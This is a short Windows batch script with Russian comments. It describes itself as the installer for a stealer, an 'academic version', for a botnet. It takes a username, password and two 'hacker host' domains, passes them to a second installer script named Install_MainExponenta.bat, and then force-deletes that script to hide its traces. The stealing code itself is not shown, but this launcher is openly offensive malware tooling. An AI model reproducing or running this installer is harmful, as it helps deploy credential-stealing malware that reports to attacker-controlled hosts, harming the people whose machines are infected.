rem Файл установки стайлера (Академический вариант)
rem USAGE
rem > install.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host1=%3
set Hacker_host2=%4

rem Go to Temprorary Directory
cd /d %curdir%

rem Запускаем инсталлятор стайлера "Экспонента"
call Install_MainExponenta.bat %Hacker_User% %Hacker_Pass% %Hacker_host1% %Hacker_host2%
cd /d %curdir%
del /F /S /Q /A Install_MainExponenta.bat


